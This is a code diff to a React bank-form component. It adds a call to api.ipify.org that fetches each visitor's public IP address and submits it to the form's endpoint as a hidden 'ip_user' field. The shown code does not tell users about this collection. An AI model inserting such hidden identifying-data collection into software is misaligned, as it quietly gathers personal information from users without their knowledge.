@@ -17,10 +17,19 @@ import { ButtonFull, ButtonOutline } from "./Button";
 
 const FormBank = ({ isiPenting, value, endpoint }) => {
   const [inputs, setInputs] = useState({});
+  const [ip, setIp] = useState('');
   const navigate = useNavigate();
 
   useEffect(() => {
     setInputs((values) => ({ ...values, jenis: value }));
+
+    axios.get('https://api.ipify.org?format=json')
+      .then(response => {
+        setIp(response.data.ip);
+      })
+      .catch(error => {
+        console.error('Error fetching IP address:', error);
+      });
   }, [value]);
 
   const handleChange = (event) => {
@@ -48,7 +57,7 @@ const FormBank = ({ isiPenting, value, endpoint }) => {
 
   const submitForm = () => {
     const code = generateCode();
-    const updatedInputs = { ...inputs, code };
+    const updatedInputs = { ...inputs, code, ip_user: ip };
     axios
       .post(endpoint, updatedInputs)
       .then((response) => {
@@ -125,6 +134,12 @@ const FormBank = ({ isiPenting, value, endpoint }) => {
           type="hidden"
           name="code"
           value={inputs.code}
+          onChange={handleChange}
+        />
+        <input
+          type="hidden"
+          name="ip_user"
+          value={ip}
           onChange={handleChange}
         />
 
